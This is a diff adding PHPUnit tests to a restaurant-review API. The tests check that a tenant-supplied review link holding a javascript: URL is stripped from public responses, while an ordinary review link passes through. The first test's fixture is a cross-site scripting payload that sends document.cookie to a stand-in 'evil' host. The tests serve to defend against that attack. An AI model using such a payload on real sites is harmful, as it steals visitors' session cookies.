@@ -100,6 +100,38 @@ class InternalReviewTest extends TestCase
         return $review;
     }
 
+    /**
+     * review_public_url is tenant-controlled and lands in an <a href> on the
+     * public menu, so a javascript: value must never reach the client.
+     */
+    public function test_a_dangerous_review_url_is_never_returned_to_the_public(): void
+    {
+        $this->restaurant->forceFill([
+            'review_public_url' => 'javascript:fetch("//evil?c="+document.cookie)',
+        ])->save();
+
+        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
+            'rating' => 5,
+            'comment' => 'Great!',
+        ])
+            ->assertCreated()
+            ->assertJsonPath('data.public_review_url', null);
+
+        $this->getJson("/api/public/restaurants/{$this->restaurant->slug}/menu")
+            ->assertOk()
+            ->assertJsonPath('data.restaurant.review_public_url', null);
+    }
+
+    /** A legitimate review link still reaches the diner untouched. */
+    public function test_a_normal_review_url_is_passed_through(): void
+    {
+        $this->restaurant->forceFill(['review_public_url' => 'https://g.page/r/abc/review'])->save();
+
+        $this->getJson("/api/public/restaurants/{$this->restaurant->slug}/menu")
+            ->assertOk()
+            ->assertJsonPath('data.restaurant.review_public_url', 'https://g.page/r/abc/review');
+    }
+
     // AC-008 — a review left from a table session links to its table/branch/area.
     public function test_public_create_links_to_table_when_session_given(): void
     {
